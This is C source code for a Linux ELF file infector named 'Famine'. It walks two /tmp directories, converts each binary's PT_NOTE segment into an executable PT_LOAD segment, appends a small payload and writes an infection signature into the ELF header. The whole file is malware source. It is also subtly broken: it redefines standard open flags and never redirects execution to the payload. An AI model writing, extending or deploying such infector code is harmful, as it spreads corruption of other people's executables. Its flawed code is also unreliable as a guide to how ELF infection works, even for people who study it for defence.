#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <sys/ptrace.h>

#define DIRENT_BUFFSIZE 1024
#define PATH_1 "/tmp/test"
#define PATH_2 "/tmp/test2"
#define O_RDONLY 00
#define O_WRONLY 01
#define O_RDWR 02

#define SIGNATURE_BYTE_1 0x44
#define SIGNATURE_BYTE_2 0x52
#define SIGNATURE_BYTE_3 0x45
#define SIGNATURE_BYTE_4 0x00 

#include <stdbool.h>

bool is_elf_and_infected(int fd, Elf64_Ehdr *ehdr)
{
    if (pread(fd, ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr))
    {
        perror("Failed to read ELF header");
        return false;
    }

    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0 || ehdr->e_ident[EI_CLASS] != ELFCLASS64)
    {
        return false;
    }

    if (ehdr->e_ident[EI_PAD] == SIGNATURE_BYTE_1 &&
        ehdr->e_ident[EI_PAD + 1] == SIGNATURE_BYTE_2 &&
        ehdr->e_ident[EI_PAD + 2] == SIGNATURE_BYTE_3 &&
        ehdr->e_ident[EI_PAD + 3] == SIGNATURE_BYTE_4)
    {
        
        char buffer[20];
        if (pread(fd, buffer, sizeof(buffer), lseek(fd, 0, SEEK_END) - sizeof(buffer)) == sizeof(buffer))
        {
            if (strstr(buffer, "Infected by Famine") != NULL)
            {
                printf("File is infected by Famine.\n");
                return true;
            }
        }
    }

    return false;
}

int modify_phdr_for_infection(int fd, Elf64_Ehdr *ehdr)
{
    Elf64_Phdr phdr;
    off_t ph_offset = ehdr->e_phoff;
    size_t phentsize = ehdr->e_phentsize;
    size_t phnum = ehdr->e_phnum;

    for (int i = 0; i < phnum; i++)
    {
        if (pread(fd, &phdr, phentsize, ph_offset) != phentsize)
        {
            perror("Failed to read program header");
            return -1;
        }

        if (phdr.p_type == PT_NOTE)
        {
            phdr.p_type = PT_LOAD;
            phdr.p_flags |= PF_X | PF_W | PF_R;

            if (pwrite(fd, &phdr, phentsize, ph_offset) != phentsize)
            {
                perror("Failed to write modified program header");
                return -1;
            }
            break;
        }
        ph_offset += phentsize;
    }
    return 0;
}

int infect_file(const char *file_path)
{
    int fd = open(file_path, O_RDWR);
    if (fd < 0)
    {
        perror("Open failed");
        return -1;
    }

    Elf64_Ehdr ehdr;
    if (is_elf_and_infected(fd, &ehdr))
    {
        printf("File %s is already infected.\n", file_path);
        close(fd);
        return 0;
    }

    if (modify_phdr_for_infection(fd, &ehdr) < 0)
    {
        perror("Failed to modify program headers");
        close(fd);
        return -1;
    }

    const char payload[] = "\x90\x90\x90\x90\xC3Infected by Famine";
    
    off_t end_offset = lseek(fd, 0, SEEK_END);

    if (write(fd, payload, sizeof(payload)) != sizeof(payload))
    {
        perror("Failed to write payload");
        close(fd);
        return -1;
    }

    ehdr.e_ident[EI_PAD] = SIGNATURE_BYTE_1;
    ehdr.e_ident[EI_PAD + 1] = SIGNATURE_BYTE_2;
    ehdr.e_ident[EI_PAD + 2] = SIGNATURE_BYTE_3;
    ehdr.e_ident[EI_PAD + 3] = SIGNATURE_BYTE_4;
    if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr))
    {
        perror("Failed to write infection marker");
        close(fd);
        return -1;
    }

    printf("Infected %s successfully.\n", file_path);
    close(fd);
    return 0;
}

void infect_directory(const char *dir_path)
{
    DIR *dir = opendir(dir_path);
    if (!dir)
    {
        perror("Failed to open directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_type == DT_REG)
        {
            char file_path[512];
            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
            infect_file(file_path);
        }
    }
    closedir(dir);
}

int main(int argc, char *argv[])
{
    if (chdir(PATH_1) == 0)
    {
        infect_directory(PATH_1);
    } 
    if (chdir(PATH_2) == 0)
    {
        infect_directory(PATH_2);
    }

    return 0;
}
